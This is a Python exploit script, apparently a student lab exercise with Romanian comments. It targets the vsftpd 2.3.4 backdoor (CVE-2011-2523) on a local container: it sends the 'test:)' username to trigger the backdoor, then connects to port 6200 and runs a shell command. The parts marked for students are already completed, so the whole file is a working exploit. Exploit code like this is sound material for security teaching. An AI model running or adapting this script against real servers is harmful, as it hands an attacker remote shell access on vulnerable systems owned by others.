
# ftp_backdoor_exploit.py
#
# Exploit pentru vulnerabilitatea vsftpd 2.3.4 (CVE-2011-2523)
#
# Flux:
#   1. Conectare la FTP pe portul 2121
#   2. Trimitere username "test:)"
#   3. Trimitere parolă arbitrară
#   4. Conectare la backdoor pe portul 6200
#   5. Trimitere comandă shell ("id", "whoami")
#
# STUDENT TASK:
# Completați zonele marcate cu "STUDENT CODE".

import socket
import time

FTP_HOST = "127.0.0.1"   # or your host IP
FTP_PORT = 2121          # host port mapped to container's 21
BACKDOOR_PORT = 6200     # but see note below
TIMEOUT = 2

def trigger_backdoor():
    """Activează backdoor-ul prin trimiterea USER test:)"""
    print("[*] Connecting to FTP service...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)

    # STUDENT CODE START
    s.connect((FTP_HOST, FTP_PORT))

    banner = s.recv(1024).decode()
    print("[+] FTP Banner:", banner.strip())

    # Trimitere comandă care activează backdoor-ul
    s.sendall(b"USER test:)\r\n")
    s.sendall(b"PASS anything\r\n")

    # Pauză scurtă pentru ca serverul să pornească backdoor-ul
    time.sleep(0.2)

    s.close()
    # STUDENT CODE END

    print("[+] Backdoor triggered.")
    return True


def connect_backdoor():
    """Se conectează la portul backdoor și execută o comandă."""
    print("[*] Connecting to backdoor on port 6200...")

    # STUDENT CODE START
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((FTP_HOST, BACKDOOR_PORT))

    # Trimite o comandă shell
    s.sendall(b"id\n")

    response = s.recv(1024).decode()
    s.close()
    # STUDENT CODE END

    print("[+] Backdoor response:")
    print(response)
    return response


def main():
    print("=== VSFTPD 2.3.4 Exploit ===")

    try:
        trigger_backdoor()
        connect_backdoor()
    except Exception as e:
        print("[-] Exploit failed:", e)


if __name__ == "__main__":
    main()